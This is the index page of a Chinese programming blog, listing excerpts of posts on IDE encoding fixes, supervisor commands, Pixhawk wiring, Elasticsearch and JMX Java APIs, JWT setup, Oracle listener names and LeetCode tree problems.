<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大白的博客">
		<meta property="og:title" content="编程大白的博客" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b46b5efbb8b53d87e3c9741788bdb63/" rel="bookmark">
			解决Intellij IDEA控制台，logger.info()，system.out.println()等中文乱码问题（最完美篇）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当我们使用Intellij IDEA开发时，首当其冲就是中文乱码问题，造成中文乱码的根本原因是开发工具和系统环境编码格式不匹配，这篇文章能100%完美解决你所有乱码问题。 乱码主要分为如下2种大类
一 ： 编写环境乱码
二 ： 控制台打印乱码（又包含3种）： IDEA启动时控制台打印乱码 log4j的logger.info()控制台打印乱码 system.out.println()控制台打印乱码 一 ： 解决编写环境乱码 1. 首先是编译器语言 file -&gt; settings -&gt;Appearance(外观) -&gt; theme(主题设置) -&gt; use custom font
(最好不设置采用默认语言，或选择如下图能支持中文的语言，避免出现中文乱码)
2. 设置工程项目编码 file -&gt; settings -&gt; Editor -&gt; File Encodings-&gt; 如下图通通UTF-8
二 ： 解决控制台打印乱码（3种） 1. IDEA Tomcate启动时控制台打印乱码
根据Intellij IDEA控制台输出，Tomcat Catalina Log出现乱码，因此可以将问题定位到Tomcat上。那么，我们看看Tomcat控制台是否出现乱码。如老夫所料果然乱码，见下图。
解决IDEA Tomcat输出乱码一共两种方案任选一种即可，备注：如下（方案一）与（方案二）不能同时设置。
（方案一）
用Notepad++打开Tomcat安装源码conf文件夹下的logging.properties文件。
如下logging.properties文件内容，将下图标记的UTF-8改为GBK
备注：只修改第五个java.util.logging.ConsoleHandler.encoding = GBK,其它4个可以不修改，效果一样。
打开Intellij IDEA，乱码问题解决
再打开Tomcat控制台也不显示乱码
（方案二）
打开Intellij idea安装目录，在bin目录下的idea.exe.vmoptions和idea64.exe.vmoptions两个文件结尾添加
-Dfile.encoding=UTF-8（注意不要出现空格）
接着再修改idea配置Help -&gt;Edit Custom VM Options
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b46b5efbb8b53d87e3c9741788bdb63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23a3f9fe9e60da33b6177303979381a8/" rel="bookmark">
			C语言程序，字符串逆序：1sample答案错误，2运行时最长串错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #include&lt;stdio.h&gt; #include&lt;string.h&gt; int main() { char a[80]; int i, m; gets(a); m = strlen(a); for(i = m;i &gt;= 0;i--){ printf("%c",a[i]); } return 0; } 错误1
当采用字符串数组最后面有一个‘\0’这个，因此打印时应该从m-1开始
错误2
最长串运行时错误，意思就是打印80个字符时错误，那么也是由于有一个‘\0’占位，所以开始的数组必须+1
#include&lt;stdio.h&gt; #include&lt;string.h&gt; int main() { char x, a[81]; int i, m; gets(a); m = strlen(a); for(i = m-1;i &gt;= 0;i--){ printf("%c",a[i]); } return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ed5b26ee8e9e06dd98d29dee2bf2f54/" rel="bookmark">
			如何使静态图片做成动态效果？怎么让静态图片动起来
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果用手机拍了一组张片，想要将这些静态图片合成动态的该怎么操作呢?将多张图片合成一张gif动图的方式，既能够占据更少的内存，还能够提升图片的趣味性，拥有更好的展示效果，简直是一举两得。接下来给大家分享下如何使用手机在线完成gif制作（https://www.gif.cn/）图片合成，具体的操作步骤是怎样的，一起来看一下。
打开手机自带浏览器或者其他下载的浏览器都可以，搜索gif中文网。
进入网站首页，点击“添加图片”，选择手机相册/文件管理中准备好的静态图片。
设置GIF动图的宽或者高，只需填写最重要的一项就可以了，另一项会自动计算生成。比如如下图所示，宽的要求是500像素，那么就填入500，另一项值自动生成，删除水印文字框中的链接，然后点击生成gif，即可下载无水印的动态图片。注意，图片质量越高，图片的清晰度越高，在生成之前还需要注意图片质量的选择。
gif在线生成之后，点击下载图片，浏览器会弹出“立即下载”的弹出框，点击下载，就可以完成使用手机来合成gif动图的操作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/222352655ee4103134134515d4d1326b/" rel="bookmark">
			supervisor 常用命令的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、开启命令 supervisor的服务器端部分启动命令： sudo unlink /var/run/supervisor.socksupervisord -c /etc/supervisor/supervisord.conf 此时默认开启了所有服务 二、supervisor的客户端部分命令： supervisorctl status 查看进程运行状态supervisorctl start 进程名 启动进程supervisorctl start laravel-worker:* 批量启动进程supervisorctl stop 进程名 关闭进程supervisorctl restart 进程名 重启进程supervisorctl update 重新载入配置文件supervisorctl shutdown 关闭supervisordsupervisorctl clear 进程名 清空进程日志supervisorctl 进入到交互模式下。使用help查看所有命令 supervisorctl reread supervisorctl update 上面两个命令是修改supervisor配置文件后，需要运行才能生效的命令
start stop restart + all 表示启动，关闭，重启所有进程 三、关闭命令 supervisorctl stop all先关闭supervisor服务
之后再关闭supervisord服务
kill -9 pid
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6f140bf38f75170cef7a9b6a5b908de/" rel="bookmark">
			多旋翼飞行器设计与控制·Pixhawk4以及外部设备接线（笔记004）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		笔记主要来源：Pixhawk 4 接线快速入门
目录
一、Pixhawk 4 的各个接口
二、接线图概览（重要传感器及外围设备）
三、飞控、GPS的安装和方向
四、电源
五、无线电遥控
六、数传电台（可选）
七、SD Card（可选）
八、电机以及其他外设
一、Pixhawk 4 的各个接口 FMU：Flight Management Unit 飞行管理组件
主 FMU 处理器：STM32F765 32 位 Arm® Cortex®-M7，216MHz，2MB 储存，512KB RAMIO 处理器：STM32F100 32 位 Arm® Cortex®-M3，24MHz，8KB SRAM板载传感器： 加速度计 / 陀螺仪：ICM-20689加速度计 / 陀螺仪：BMI055磁力计：IST8310气压计：MS5611GPS：ublox Neo-M8N GPS/GLONASS 接收器；集成磁力计 IST8310接口： 8-16 路PWM输出（8路来自 IO，8路来自 FMU）FMU 上有 3 路专用 PWM/Capture 输入用于 CPPM 的专用遥控输入用于 Spektrum / DSM 与 有模拟 / PWM RSSI 的 S.Bus 的专用遥控输入专用 S.Bus 舵机输出5 个通用串行接口3 个 I2C 接口4 路 SPI 总线多达 2 路 CAN 总线用于带串口的电调两路电池电压 / 电流模拟输入口电源系统： 电源模块输出：4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a6f140bf38f75170cef7a9b6a5b908de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a6d776b57ecceedb6973ac7a29eff07/" rel="bookmark">
			成功解决 3DMAX报错:3D MAX application 已停止工作的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 成功解决 3DMAX报错:3D MAX application 已停止工作的解决方法
解决问题 成功解决 3DMAX报错:3D MAX application 已停止工作的解决方法
解决思路 软件出错，重新安装
解决方法 第一步，先把3D MAX 卸载掉，连同所有和3D相关的文件全部卸除干净。第二步，把win7 系统盘下的用户→XX(自己设置的开机名)文件夹→AppData文件夹→Local文件夹→Autodesk文件夹下的所有文件全部删除。第三步，在系统盘下搜索software licenses 文件→删除→重启→重新安装3D，就可以正常使用了。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e913fd9dd1d112d369d6526aa575afc/" rel="bookmark">
			IntelliJ Idea 恢复安装时初始状态
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IntelliJ Idea 恢复安装时初始状态 IntelliJ Idea 恢复安装时初始状态 IntelliJ Idea 恢复安装时初始状态 对于新手来说
难免会遇到一些 配置 和 设置 的问题
甚至软件崩溃
头疼
各种问题让我们是有去无回啊
每次出现了各种各样的问题后
很多伙伴会选择重新安装
但是重新安装需要时间
今天 沁禹 给大家分享一个新的解决办法
使 IntelliJ Idea 恢复安装时的初始状态 很简单
删除：“C:\Users\User”下的 ".IntelliJIdea2019.3"文件夹
删除配置文件后点击IntelliJ Idea重新启动即可
注意：此过程会导致IntelliJ Idea重新激活
PS: 我的版本是.IntelliJIdea2019.3（举一反三）你是什么版本就选择对应文件
好了到这我们的教程也结束了 😉
希望以上方法可以帮到您，祝您学习愉快！💖
👇
对您有帮助的话记点赞得收藏哦！👍
我是 沁禹 一个在互联网摸爬滚打的工具人 😛
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0bc763ec6f9ae6ad20991ce44ffe3cf6/" rel="bookmark">
			PHP学习进阶
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基础篇 熟悉常用数组处理函数 // 数组元素添加移除 array_push array_pop array_unshift array_shift // 数组自定义操作 array_map array_walk array_reduce // 多数组操作 array_merge array_diff array_intersect // 其他高频使用 array_key_exists in_array array_unique array_sum is_array array_column // 其他 array_keys array_values array_filter array_multisort array_reverse array_slice array_search 字符串处理函数（区别 mb_ 系列函数） &amp; 引用，结合案例分析 == 与 === 区别 ===比较两个变量的值和类型；==比较两个变量的值，不比较数据类型。 isset 与 empty 区别
全部魔术函数理解
static、$this、self 区别
private、protected、public、final 区别
OOP 思想
抽象类、接口 分别使用场景
Trait 是什么东西
echo、print、print_r 区别
__construct 与 __destruct 区别
static 作用（区分类与函数内）
__toString() 作用
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0bc763ec6f9ae6ad20991ce44ffe3cf6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48bf19f2afcf250366939573da427f7b/" rel="bookmark">
			Elasticsearch Java API使用详解（基本操作增删改、条件查询QueryBuilders、映射mapping）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
在前面的两篇文章中分别介绍了Elasticsearch和head插件的安装部署：
Elasticsearch5.2.2 安装部署与常见启动报错解决
Elasticsearch head插件安装过程详解
在本篇文章，将结合具体的例子重点介绍Elasticsearch Java API的操作。
Elasticsearch的Java客户端非常强大；它可以建立一个嵌入式实例并在必要时运行管理任务。运行一个Java应用程序和Elasticsearch时，有两种操作模式可供使用。该应用程序可在Elasticsearch集群中扮演更加主动或更加被动的角色。在更加主动的情况下（称为Node Client），应用程序实例将从集群接收请求，确定哪个节点应处理该请求，就像正常节点所做的一样。（应用程序甚至可以托管索引和处理请求。）另一种模式称为Transport Client，它将所有请求都转发到另一个Elasticsearch节点，由后者来确定最终目标。
一、API基本操作
1、操作环境准备
Elasticsearch和head插件已经安装部署好，并已经启动成功创建Maven工程，导入以下依赖： &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.elasticsearch&lt;/groupId&gt; &lt;artifactId&gt;elasticsearch&lt;/artifactId&gt; &lt;version&gt;5.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.elasticsearch.client&lt;/groupId&gt; &lt;artifactId&gt;transport&lt;/artifactId&gt; &lt;version&gt;5.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 等待依赖的jar包下载完成在Maven工程的resources目录下新建一个文件log4j2.xml ，然后在该文件中下入以下配置信息： &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;Configuration&gt; &lt;Appenders&gt; &lt;Console name="STDOUT" target="SYSTEM_OUT"&gt; &lt;PatternLayout pattern="%d %-5p [%t] %C{2} (%F:%L) - %m%n"/&gt; &lt;/Console&gt; &lt;RollingFile name="RollingFile" fileName="logs/strutslog1.log" filePattern="logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz"&gt; &lt;PatternLayout&gt; &lt;Pattern&gt;%d{MM-dd-yyyy} %p %c{1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/48bf19f2afcf250366939573da427f7b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c779280bcb0efabe92cc718877648d95/" rel="bookmark">
			JMX获取jvm参数，cpu使用率，内存，线程，类等信息,实现一个简单的web版jvisualvm
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 什么是JMX JMX（英语：Java Management Extensions，即Java管理扩展）是Java平台上为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用。
以上是维基百科的介绍
JMX即Java Management Extensions（Java管理扩展），是Java SE的一部分，在Java2的时候加入到Java SE平台中，但Java5才正式发布。JMX提供了一个非常简单的途径去管理应用程序的资源，这里的所说的资源包括内存资源，磁盘资源等，而且因为JMX相关技术是动态的，所以可以在应用程序运行时监控和管理资源。
想必大家都听说过 jconsole或jvisualvm，它们就是用jmx实现的。
二 MBean 具体可参阅oracle官网
MBean是类似于JavaBeans组件的托管Java对象，它遵循JMX规范中阐明的设计模式。MBean可以代表设备，应用程序或任何需要管理的资源。MBean公开了一个包含以下内容的管理接口：
一组可读或可写的属性，或两者兼而有之。一组可调用的操作。自我描述。 在MBean实例的整个生命周期中，管理界面都不会更改。当某些预定义事件发生时，MBeans也可以发出通知。
JMX规范定义了五种类型的MBean：
Standard MBeansDynamic MBeansOpen MBeansModel MBeansMXBeans 下面介绍了一种特殊的MBean类型，称为MXBeans。
一个的MXBean是一种MBean的只引用一组预定义的数据类型。这样，您可以确保您的MBean可被任何客户端（包括远程客户端）使用，而无需客户端有权访问代表MBean类型的特定于模型的类。MXBean提供了一种方便的方法来将相关值捆绑在一起，而无需将客户端特别配置为处理捆绑。
以与标准MBean相同的方式，通过编写称为的Java接口SomethingMXBean和实现该接口的Java类来定义MXBean 。但是，与标准MBean不同，MXBean不需要调用Java类Something。接口中的每个方法都定义MXBean中的属性或操作。注释@MXBean也可以用于注释Java接口，而不是要求接口名称后跟MXBean后缀。
软件包中的Java 2 Platform Standard Edition（J2SE）5.0软件中存在MXBean java.lang.management。
包里提供了许多MXBean的接口类，可以很方便的获取到JVM的内存、GC、线程、锁、class、甚至操作系统层面的各种信息,本文就简单的介绍 一种利用JMX对JAVA进程进行CPU、堆内存使用的监控。咱们经常使用jsconsole中的（概述/内存/线程/类/vm概要）就是通过java.lang.management中的定义的MXBean 获取到的。·
目前java平台主要提供了下图所示的9个MXBean, 各个MXBean的作用根据类名大概能猜出几分，具体可查API。
java.lang.management包中的mxbean提供了基本的功能，在sum.com.management中对某些功能有所增强，当然我们也可以根据JMX规范提供自己的MXBean。
三 获取MXBean 获取MXBean有本地调用和jmxrmi(远程调用)两种方式，通过ManagementFactory（java.lang.management.ManagementFactory）工厂类获取。
ManagementFactory类是用于获取Java平台的受管Bean的工厂类。 该类由静态方法组成，每个方法返回一个或多个表示Java虚拟机组件的管理接口的平台MXBeans 。 1 本地调用 本地调用自能获取当前程序所运行的jvm所加载的MXBean信息
//获取内存 MemoryMXBean memoryMXBean = ManagementFactory.getMemoryMXBean(); //获取编译信息 CompilationMXBean compilationMXBean = ManagementFactory.getCompilationMXBean(); //获取系统信息 OperatingSystemMXBean operatingSystemMXBean = ManagementFactory.getOperatingSystemMXBean(); //获取运行时信息 RuntimeMXBean runtimeMXBean = ManagementFactory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c779280bcb0efabe92cc718877648d95/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f161ffca53a758404e9e706cae322b1b/" rel="bookmark">
			.net core 3.1  webapi接口项目框架搭建二：JWT 身份验证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JWT 身份验证 引言引用依赖包添加身份认证相关服务到容器中swagger 中配置JWT开启中间件生成Token获取claims中的参数信息接口中添加[Authorize()]jwt 自定义策略 引言 JWT定义与优缺点
引用依赖包 Microsoft.AspNetCore.Authentication.JwtBearer
System.IdentityModel.Tokens.Jwt
添加身份认证相关服务到容器中 在 Startup.cs 文件 ConfigureServices 方法中 添加服务
services.AddAuthentication(x=&gt; { x.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme; x.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme; }).AddJwtBearer(jwtOptions =&gt; { byte[] btKey = Encoding.UTF8.GetBytes(AppSettingHelper.JsonWebTokenDto.Secret); SecurityKey securityKey = new SymmetricSecurityKey(btKey); jwtOptions.TokenValidationParameters = new TokenValidationParameters { IssuerSigningKey = securityKey, //将用于检查令牌的发行者是否与此发行者相同。 ValidIssuer = AppSettingHelper.JsonWebTokenDto.Issuer, //是否验证发行者 ValidateIssuer = AppSettingHelper.JsonWebTokenDto.ValidateIssuer, //检查令牌的受众群体是否与此受众群体相同。 ValidAudience = AppSettingHelper.JsonWebTokenDto.Audience, //在令牌验证期间验证受众 . ValidateAudience = AppSettingHelper.JsonWebTokenDto.ValidateAudience, //验证生命周期 ValidateLifetime = true, // The signing key must match!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f161ffca53a758404e9e706cae322b1b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7da84eddca3503de759cd16581072f9f/" rel="bookmark">
			GLOBAL_DBNAME&amp;SID_NAME&amp;SERVICE_NAME&amp;ORA-12537: TNS:connection closed
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		User:Administrator Last Update:2020-7-17 12:01 ### Code Reference URL:https://docs.oracle.com/database/121/NETAG/listenercfg.htm#NETAG302
URL:https://blog.csdn.net/weixin_43885834/article/details/104435592
DESC:GLOBAL_DBNAME&amp;SID_NAME&amp;SERVICE_NAME&amp;ORA-12537: TNS:connection closed
Last Update:2020-7-17 12:02
Time：2020-7-17 12:02 Tittle：GLOBAL_DBNAME&amp;SID_NAME&amp;SERVICE_NAME&amp;ORA-12537: TNS:connection closed
Version:002
GLOBAL_DBNAME&amp;SID_NAME&amp;SERVICE_NAME的概念和区别
glocal_name
对一个数据库的唯一标识，在创建数据库的时候决定，缺省值为db_name.db_domain。在之后对参数文件中db_name和db_domain参数的任何修改都不影响global_name的值，如果要修改glocal_name,只能alter database rename global_name to &lt;db_name,db_domain&gt;来进行修改，然后修改相应的参数
service_name
在oracle的并行环境中，一个数据库对应多个实例，就需要多个网络服务名，设置比较繁琐。service_names参数就是为了解决这个问题，该参数对应一个数据库，而不是一个实例，缺省值为db_name.db_domain，即等于global_name。一个数据库可以对应多个service_name.
oracle_sid
oracle_sid这个参数是操作系统中用到的，他是描述默认连接的数据库实例.instance_name是数据库参数。而oracle_sid是操作系统的环境变量，oracle_sid必须与instance_name的值一致。
验证
CDB&amp;PDB instance name
-- 查看CDB实例名称(数据库参数) show parameter instance_name; -- 查看PDB实例名称(和CDB一致) alter session set container=PDB2; show parameter instance_name; [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-JgBASiP2-1594972759934)(http://192.168.100.132/uploads/big/6b01443f3ee9e71ec9a59bc4007b20ac.png)]
CDB&amp;PDB glocal_name
-- 查看CDB global_name名称(数据库参数ORCDB.EXAMPLE.COM) select * from global_name; -- 查看PDB global_name名称(和CDB不一致PDB2.EXAMPLE.COM) alter session set container=PDB2; select * from global_name; listener.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7da84eddca3503de759cd16581072f9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce2b7ae4612656f2a642d76f61259d9e/" rel="bookmark">
			Android Studio 初始程序时sync出现connection reset
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《转载》并 自己亲测有效的方法，应该可以解决大部分情况下的sync加载出错的问题 第一步，打开一个自己出现标题错误的程序 把 //google()
//jcenter()
改为
maven { url 'https://maven.aliyun.com/nexus/content/repositories/google' }
maven{ url 'http://maven.aliyun.com/nexus/content/groups/public/' }
maven{ url 'http://maven.aliyun.com/nexus/content/repositories/jcenter'}
buildscript {
repositories {
//google()
//jcenter()
maven { url 'https://maven.aliyun.com/nexus/content/repositories/google' }
maven{ url 'http://maven.aliyun.com/nexus/content/groups/public/' }
maven{ url 'http://maven.aliyun.com/nexus/content/repositories/jcenter'}
}
dependencies {
classpath 'com.android.tools.build:gradle:3.5.3'
// NOTE: Do not place your application dependencies here; they belong
// in the individual module build.gradle files
}
}
allprojects {
repositories {
maven { url 'https://maven.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce2b7ae4612656f2a642d76f61259d9e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d3ba13e911034f3b5caa00fe84bd0e90/" rel="bookmark">
			AcWing&#43;力扣 树结构题解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		101-对称二叉树 要保证对称，从2边同时向下同步寻找值
104-二叉树的最大深度 先看这个点是不是叶节点，如果是的话，那么比较最大值，不是的话继续深搜
145-二叉树的后序遍历 这题的题解还是比较详细的，主要要弄懂递归的思路是什么，以及nullptr要在什么时候插入，为何插入进行了解。先了解先序递归的套路，再想后序递归会简单很多。
105-从前序与中序遍历中构建二叉树 这里的bulidtree中参数传了TreeNode*&amp;root，表示引用，我们在这个函数可以修改root，如果不引用，root相当于没指引
验证二叉树的前序序列化 看题解才明白怎么做，毕竟我也是新手啊，哭了。
其实只要从左到右遍历，我们仔细观察或者推演一下，一个完全二叉树，最后#个数一定比整数个数大一，并且为了满足每个节点都可以具备完全二叉树的条件，#的数目不能太多，一旦比整数个数多1，那么肯定需要这个string已经遍历到结尾了，如果没有，那么没空间来继续放整数或者#了，所以这是一个false条件。其他得没啥。
二叉树的层序遍历 这题其实和访问最深深度差不多的思想，前序遍历，哪一层入那一层的vector
这题有个vector的resize函数，表示重新设置vector的长度，这题用这个函数好很多。
中序遍历，找值，找到值放进map，如果里面有target-值，那么flag为true，不用剪枝，不会超时。
236-二叉树的最近公共祖先 对于任何一个结点，都可以看成是以该结点为root的树，所以可以递归，要找最近公共祖先，如果p，q在两边，则返回root，如果，只有一边有，另一边没有，则返回有的那一边，不断返回，直到返回到两边都有时，返回根。
543-二叉树的直径 直径要由左子树最深深度和右子树最深深度加起来。
所以我们要定义一个dfs返回最深深度，并且在递归中记录最大直径。
124-二叉树的最大路劲和 刚开始想到了树形DP，和树形DP很像，但是构建不出树来，所以放弃了
我们从第2个图看，最大值可能由-10作为连接点，连接左右子树，也可能知识单个子树的最大值。那么我们只要记录这两个值，比较最大值，就可以得到。dfs，返回调一个子树的最大值，比如-10要调用20，那么我们对于20结点，可以选20-15，也可以20-7，我们只要比较这2结点和最大值，就行。那么怎么判断15-20-7这3个结点的最大值，我们需要在遍历20结点时，遍历完左右字数后，将两子树的与结点值求和看一下多大。
87-扰乱字符串 我们从1枚举到length-1，保证每个二叉树的种类都可能被枚举到，如长度5的，有1和4，2和3，3和2，4和1建树的。然后对每个种类，我们再次判断，看看这个类别能不能扰乱，即再次枚举，比如1和4中，1肯定可以，不用扰乱，4我们从1到3枚举，看看能不能再次分开，使得分开的字符串能不能相等，如果排序都不相等，说明字符串不能以这个种类分，false，直到最后分到最后是s1==s2时，返回true，中途一旦有个地方字符串分开导致，左右子树的字符串不相等，都会false。只有不断保证左右子树的字符串排序后相等，才能是扰乱的字符串。
117-填充每个结点的下一个右侧结点的指针 扫描一行时，用tail指针不断的将一行的所有结点的所有子结点连起来，然后，当我们一行扫完后，我们用dummy指针来维护下一行的起始节点，定义一个dummy结点，再将该节点赋值给tail结点，这样tail和dummy指向的是同一个地方，所以维护了dummy的值。
99-恢复二叉搜索树 二叉搜索树的特点是中序遍历会得到排序，这里交换2个数字相当于把原来得排序扰乱了，可以开个vector进行存储值，然后找到这2个扰乱得值，进行交换就可。
当然也可以迭代遍历，用栈模拟递归。不断先找左子树，找完就把根点遍历，遍历完就再遍历右子树。这里的如果head-&gt;right为NULL时，相当于一个树的左结点全部遍历结束，然后root=NULL，这是，在栈中拿出根结点，遍历。
337-打家劫舍 经典得树形DP题目，不过这边用树，我们用dp有点麻烦，直接dfs，用pair得2个值来记录这个取不取的情况
以上就是树结构的AcWing的所有题解了，尽量自己先思考一遍，不会看题解。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d250e308db61d5d22a3459c80f95f056/" rel="bookmark">
			QDataStream类的官方简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据流是编码信息的二进制流，它与主机计算机的操作系统，CPU或字节顺序无关。 例如，运行Windows的Sun SPARC可以读取Windows下PC写入的数据流。
您还可以使用数据流来读取/写入未编码的原始二进制数据。 如果要“解析”输入流，请参见QTextStream。
QDataStream类实现C ++基本数据类型的序列化，例如char，short，int，char *等。更复杂的数据的序列化是通过将数据分解为基本单元来实现的。
数据流与QIODevice紧密协作。 QIODevice表示一种输入/输出介质，可以从中读取数据或将数据写入其中。 QFile类是I/O设备的示例。
示例（将二进制数据写入流）：
QFile file("file.dat"); file.open(QIODevice::WriteOnly); QDataStream out(&amp;file); // we will serialize the data into the file out &lt;&lt; QString("the answer is"); // serialize a string out &lt;&lt; (qint32)42; // serialize an integer 示例（从流中读取二进制数据）：
QFile file("file.dat"); file.open(QIODevice::ReadOnly); QDataStream in(&amp;file); // read the data serialized from the file QString str; qint32 a; in &gt;&gt; str &gt;&gt; a; // extract "the answer is"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d250e308db61d5d22a3459c80f95f056/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/320aa83b4f4752aee12bfc2ee70c5c37/" rel="bookmark">
			idea报错ERROR StatusLogger No log4j2 configuration file found. Using default configuration: logging on
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题现象：
记一次在idea上运行调试代码的时候报的一个错，报错如下：
ERROR StatusLogger No log4j2 configuration file found. Using default configuration: logging only errors to the console. Set system property ‘log4j2.debug’ to show Log4j2 internal initialization logging.
原因：
在pom.xml文件中导入了log4j的依赖：
&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt; &lt;/dependency&gt; 但是，log4j2的配置文件并没有导入，尝试导入log4j.properties ,但并不行，需要导入log4j2.xml
解决办法：
在工程的resources目录下新建一个文件：log4j2.xml ，然后在该文件中下入以下配置信息：
